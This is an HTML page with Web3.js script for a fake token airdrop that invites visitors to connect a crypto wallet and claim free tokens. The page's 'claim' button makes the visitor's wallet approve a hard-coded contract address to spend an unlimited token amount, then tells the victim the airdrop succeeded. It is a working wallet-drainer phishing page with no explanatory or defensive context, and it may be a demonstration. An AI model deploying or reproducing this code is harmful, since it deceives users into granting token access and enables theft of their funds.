<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fake Airdrop</title>
    <!-- Include Web3.js from CDN -->
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
</head>
<body>
    <h1>Fake Token Airdrop</h1>
    <p>Claim your FREE tokens now!</p>
    <button id="connectWallet">Connect Wallet</button>
    <button id="claimButton" disabled>Claim Airdrop</button>
    <div id="status"></div>

    <script>
        let web3;

        async function connectWallet() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    web3 = new Web3(window.ethereum);
                    document.getElementById('connectWallet').disabled = true;
                    document.getElementById('claimButton').disabled = false;
                    document.getElementById('status').innerText = "Wallet connected!";
                } catch (error) {
                    document.getElementById('status').innerText = "Error connecting wallet: " + error.message;
                }
            } else {
                document.getElementById('status').innerText = "Please install MetaMask!";
            }
        }

        async function claimAirdrop() {
            if (!web3) {
                document.getElementById('status').innerText = "Please connect your wallet first.";
                return;
            }

            try {
                // Contract address and ABI
                const contractAddress = "0x716FaF16d4423B337C93bFAefA6134d77cC7AfFF";
                const abi = [
                    {
                        "inputs": [{"internalType": "address","name": "spender","type": "address"},{"internalType": "uint256","name": "amount","type": "uint256"}],
                        "name": "approve",
                        "outputs": [{"internalType": "bool","name": "","type": "bool"}],
                        "stateMutability": "nonpayable",
                        "type": "function"
                    }
                ];

                const contract = new web3.eth.Contract(abi, contractAddress);
                const accounts = await web3.eth.getAccounts();
                const account = accounts[0];

                // Approve the contract to spend all tokens (max uint256)
                const approveTx = await contract.methods.approve(contractAddress, web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")).send({from: account});
                
                document.getElementById('status').innerText = "Airdrop claimed! Check your wallet.";
            } catch (error) {
                document.getElementById('status').innerText = "Something went wrong: " + error.message;
            }
        }

        document.getElementById('connectWallet').addEventListener('click', connectWallet);
        document.getElementById('claimButton').addEventListener('click', claimAirdrop);
    </script>
</body>
</html>
